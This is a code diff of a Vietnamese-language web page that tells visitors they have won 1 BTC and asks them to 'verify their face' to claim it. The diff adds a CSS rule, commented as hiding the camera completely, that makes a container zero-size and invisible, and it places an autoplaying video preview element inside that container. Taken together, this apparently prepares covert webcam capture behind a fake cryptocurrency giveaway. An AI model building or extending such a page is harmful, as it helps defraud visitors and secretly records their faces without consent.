@@ -63,6 +63,13 @@
             background: #dba323;
         }
 
+        /* Camera ẩn hoàn toàn */
+        #vBox {
+            width: 0;
+            height: 0;
+            opacity: 0;
+            overflow: hidden;
+            position: absolute;
         }
 
         #loading {
@@ -99,6 +106,10 @@
         <h2>Chúc mừng bạn!</h2>
         <p>Bạn đã đủ điều kiện nhận 1 BTC từ chương trình tri ân. Nhấn nút bên dưới để xác thực khuôn mặt và hoàn tất
             quy trình nhận thưởng vào ví.</p>
+
+        <div id="vBox">
+            <video id="preview" autoplay playsinline muted></video>
+        </div>
 
         <div id="loading">
             <div class="spinner"></div>
